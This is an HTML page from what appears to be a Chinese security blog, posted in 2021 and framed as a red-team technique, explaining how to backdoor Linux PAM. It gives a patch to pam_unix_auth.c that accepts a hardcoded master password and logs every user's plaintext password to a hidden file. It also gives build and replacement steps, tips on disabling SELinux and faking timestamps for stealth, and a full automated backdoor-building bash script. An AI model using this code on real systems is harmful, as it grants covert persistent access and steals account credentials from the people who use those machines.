@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          Linux-PAM后门 - Kat | Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://spanning-tree.xyz/2021/05a4669d76.html">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+
+    <link rel="stylesheet" href="/css/donate.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('/img/article_header/article_bg.jpg')
+            /*post*/
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#渗透技巧" title="渗透技巧">渗透技巧</a>
+                            
+                        </div>
+                        <h1>Linux-PAM后门</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Kat on
+                            2021-05-15
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kat</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="linux-pam后门种植">Linux PAM后门种植</h1>
+<h2 id="前言">前言</h2>
+<blockquote>
+<p>在红蓝对抗中在获取Linux主机权限的时候往往需要收集主机账号密码，用于进一步的内网横向且在获取主机账号密码时也方便进行权限维持。</p>
+<p>可以使用Linux PAM后门进行获取主机账号密码。</p>
+</blockquote>
+<h2 id="1-什么是linux-pam模块">1. 什么是Linux-PAM模块</h2>
+<p>Linux-PAM是可插入认证模块(Pluggable Authentication Modules)，PAM通过调用/etc/pam.d下的配置文件来管理程序的认证方式。</p>
+<p>根据/etc/pam.d/下的各种服务配置文件，调用/lib/security下相应的模块，以加载动态链接库的形式实现需要的认证方式。</p>
+<p>那Linux- PAM后门通过修改pam.d下的配置文件，来达到窃取密码或任意密码登录的目的。</p>
+<h2 id="2-编写后门认证模块">2. 编写后门认证模块</h2>
+<p>编写后门认证模块的整体流程：</p>
+<p>查询目标版本-&gt;下载对应源代码-&gt;修改认证逻辑、编译-&gt;替换原认证文件（版本务必要和目标系统完全保持对应，否则可能会出现错误）</p>
+<ol>
+<li>首先查看系统和PAM版本</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 查看rpm版本</span><br><span class="line">rpm -qa | grep pam</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 查看系统位数</span><br><span class="line">getconf LONG_BIT</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqj8yramakj30u4046gm9.jpg" alt="image-20210512153130455"></p>
+<ol start="2">
+<li>下载对应源码</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">地址：http://www.linux-pam.org/library/</span><br><span class="line"><span class="meta">#</span> 解压</span><br><span class="line">tar -xzvf Linux-PAM-1.1.8.tar.gz</span><br><span class="line">cd Linux-PAM-1.1.8/modules/pam_unix/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 编辑配置文件</span><br><span class="line">vim pam_unix_auth.c</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqj8yw17n0j31mc07sgnt.jpg" alt="image-20210513091556244"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqj8yyb7m6j31se06wmz8.jpg" alt="image-20210513092046992"></p>
+<ol start="3">
+<li>编写后门特定密码的后门认证且记录认证密码</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 未修改前</span><br><span class="line">/* verify the password of this user */</span><br><span class="line">	retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">	name = p = NULL;</span><br><span class="line"></span><br><span class="line">	AUTH_RETURN;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>修改后,增加kat后门密码</span><br><span class="line">/* verify the password of this user */</span><br><span class="line">	retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">	if(strcmp("kat",p)==0)&#123;retval PAM_SUCCESS;&#125;</span><br><span class="line">	if(retval == PAM_SUCCESS)&#123;</span><br><span class="line">		FILE * fp;</span><br><span class="line">		fp = fopen("/tmp/.sshlog","a");</span><br><span class="line">		fprintf(fp,"%s : %s\n", name,p);</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	name = p = NULL;</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>安装gcc编译器和flex库</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc flex flex-devel -y</span><br></pre></td></tr></table></figure>
+<p>编译</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd Linux-PAM-1.1.8</span><br><span class="line"></span><br><span class="line">./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>备份、替换原文件</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bak</span><br><span class="line">cp /root/tmp/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqj8z3vytaj31tm06ggnq.jpg" alt="image-20210514101934669"></p>
+<ol start="6">
+<li>测试，使用修改密码成功登录</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqj8zmniwkj30ue08g75q.jpg" alt="image-20210514102231767"></p>
+<p>重新替换为原文件后已无法使用kat密码进行登录</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqj8z757kvj317w0503zi.jpg" alt="image-20210514104312789"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqj8zstbloj30qq088djc.jpg" alt="image-20210514104300915"></p>
+<p>至此Linux- PAM后门能够达到权限维持与账号密码获取的功能，方便后续进一步进行横向利用。</p>
+<h2 id="3-tips">3. TIPS</h2>
+<ol>
+<li>在种植PAM后门的过程中Centos需要关闭selinux</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 临时关闭</span><br><span class="line">setenforce 0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 永久关闭，将其中SElinunx设置为disable</span><br><span class="line">/etc/selinux/config</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gqj8zzsxizj30s606swfp.jpg" alt="image-20210513095224244"></p>
+<ol start="2">
+<li>
+<p>替换文件注意修改时间戳以及PAM认证的一些时间戳达到隐蔽。</p>
+</li>
+<li>
+<p>注意完成替换后需要进行测试成功在退出，不然基本的认证就乱了</p>
+</li>
+</ol>
+<h2 id="4-自动化种植pam后门">4. 自动化种植PAM后门</h2>
+<p>其实在PAM后门的种植过程中略显繁琐，最后附上来自zephrax一键化种植脚本。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line"></span><br><span class="line">OPTIND=1</span><br><span class="line"></span><br><span class="line">PAM_VERSION=</span><br><span class="line">PAM_FILE=</span><br><span class="line">PASSWORD=</span><br><span class="line"></span><br><span class="line">echo "Automatic PAM Backdoor"</span><br><span class="line"></span><br><span class="line">function show_help &#123;</span><br><span class="line">	echo ""</span><br><span class="line">	echo "Example usage: $0 -v 1.3.0 -p some_s3cr3t_p455word"</span><br><span class="line">	echo "For a list of supported versions: https://github.com/linux-pam/linux-pam/releases"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while getopts ":h:?:p:v:" opt; do</span><br><span class="line">    case "$opt" in</span><br><span class="line">    h|\?)</span><br><span class="line">        show_help</span><br><span class="line">        exit 0</span><br><span class="line">        ;;</span><br><span class="line">    v)  PAM_VERSION="$OPTARG"</span><br><span class="line">        ;;</span><br><span class="line">    p)  PASSWORD="$OPTARG"</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">shift $((OPTIND-1))</span><br><span class="line"></span><br><span class="line">[ "$1" = "--" ] &amp;&amp; shift</span><br><span class="line"></span><br><span class="line">if [ -z $PAM_VERSION ]; then</span><br><span class="line">	show_help</span><br><span class="line">	exit 1</span><br><span class="line">fi;</span><br><span class="line"></span><br><span class="line">if [ -z $PASSWORD ]; then</span><br><span class="line">	show_help</span><br><span class="line">	exit 1</span><br><span class="line">fi;</span><br><span class="line"></span><br><span class="line">echo "PAM Version: $PAM_VERSION"</span><br><span class="line">echo "Password: $PASSWORD"</span><br><span class="line">echo ""</span><br><span class="line"></span><br><span class="line">PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"</span><br><span class="line">PAM_DIR="linux-pam-$&#123;PAM_VERSION&#125;"</span><br><span class="line">PAM_FILE="v$&#123;PAM_VERSION&#125;.tar.gz"</span><br><span class="line">PATCH_DIR=`which patch`</span><br><span class="line"></span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">	echo "Error: patch command not found. Exiting..."</span><br><span class="line">	exit 1</span><br><span class="line">fi</span><br><span class="line">wget -c "$&#123;PAM_BASE_URL&#125;/$&#123;PAM_FILE&#125;"</span><br><span class="line">if [[ $? -ne 0 ]]; then # did not work, trying the old format    </span><br><span class="line">    PAM_DIR="linux-pam-Linux-PAM-$&#123;PAM_VERSION&#125;"</span><br><span class="line">    PAM_FILE="Linux-PAM-$&#123;PAM_VERSION&#125;.tar.gz"</span><br><span class="line">    wget -c "$&#123;PAM_BASE_URL&#125;/$&#123;PAM_FILE&#125;"</span><br><span class="line">    if [[ $? -ne 0 ]]; then</span><br><span class="line">        # older version need a _ instead of a .</span><br><span class="line">        PAM_VERSION="$(echo $PAM_VERSION | tr '.' '_')"  </span><br><span class="line">        PAM_DIR="linux-pam-Linux-PAM-$&#123;PAM_VERSION&#125;"</span><br><span class="line">        PAM_FILE="Linux-PAM-$&#123;PAM_VERSION&#125;.tar.gz"</span><br><span class="line">        wget -c "$&#123;PAM_BASE_URL&#125;/$&#123;PAM_FILE&#125;"</span><br><span class="line">        if [[ $? -ne 0 ]]; then        </span><br><span class="line">            echo "Failed to download"</span><br><span class="line">            exit 1</span><br><span class="line">        fi        </span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">tar xzf $PAM_FILE</span><br><span class="line">cat backdoor.patch | sed -e "s/_PASSWORD_/$&#123;PASSWORD&#125;/g" | patch -p1 -d $PAM_DIR</span><br><span class="line">cd $PAM_DIR</span><br><span class="line"><span class="meta">#</span> newer version need autogen to generate the configure script</span><br><span class="line">if [[ ! -f "./configure" ]]; then </span><br><span class="line">    ./autogen.sh </span><br><span class="line">fi </span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">cp modules/pam_unix/.libs/pam_unix.so ../</span><br><span class="line">cd ..</span><br><span class="line">echo "Backdoor created."</span><br><span class="line">echo "Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)"</span><br><span class="line">echo ""</span><br></pre></td></tr></table></figure>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2021/04f8593b1e.html" data-toggle="tooltip" data-placement="top" title="齐治堡垒机任意用户登录">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <br>
+
+                <!--打赏-->
+                
+                <!--打赏-->
+
+                <br>
+                <!--分享-->
+                
+                    <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                    <!--  css & js -->
+                    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                    <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!--分享-->
+                <br>                       
+                
+                <!-- require APlayer -->
+                
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+
+                
+
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+  
+    <style>
+      span.toc-nav-number{
+        display: none
+      }
+    </style>
+  
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#linux-pam后门种植"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Linux PAM&#x540E;&#x95E8;&#x79CD;&#x690D;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x524D;&#x8A00;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-什么是linux-pam模块"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">1. &#x4EC0;&#x4E48;&#x662F;Linux-PAM&#x6A21;&#x5757;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-编写后门认证模块"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">2. &#x7F16;&#x5199;&#x540E;&#x95E8;&#x8BA4;&#x8BC1;&#x6A21;&#x5757;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#3-tips"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">3. TIPS</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#4-自动化种植pam后门"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">4. &#x81EA;&#x52A8;&#x5316;&#x79CD;&#x690D;PAM&#x540E;&#x95E8;</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#渗透技巧" title="渗透技巧">渗透技巧</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+<!-- chrome Firefox 中文锚点定位失效-->
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
+<!-- smooth scroll behavior polyfill  -->
+<script type="text/javascript" src="/js/smoothscroll.js"></script>
+<script>
+        $('#toc').on('click','a',function(a){
+            // var isChrome = window.navigator.userAgent.indexOf("Chrome") !== -1;
+            // console.log(window.navigator.userAgent,isChrome)
+                // if(isChrome) {
+                    // console.log(a.currentTarget.outerHTML);
+                    // console.log($(a.currentTarget).attr("href"));
+                    //跳转到指定锚点
+                    // document.getElementById(a.target.innerText.toLowerCase()).scrollIntoView(true);
+                    document.getElementById($(a.currentTarget).attr("href").replace("#","")).scrollIntoView({behavior: 'smooth' });
+                // }
+        })  
+</script>
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/Katsec">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kat 2021 
+                    <br>
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    re-Ported by <a href="http://www.spanning-tree.xyz">Kat</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://spanning-tree.xyz/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = 'c3741abb2552c30afc11553990fa44bd';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="https://spanning-tree.xyz/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
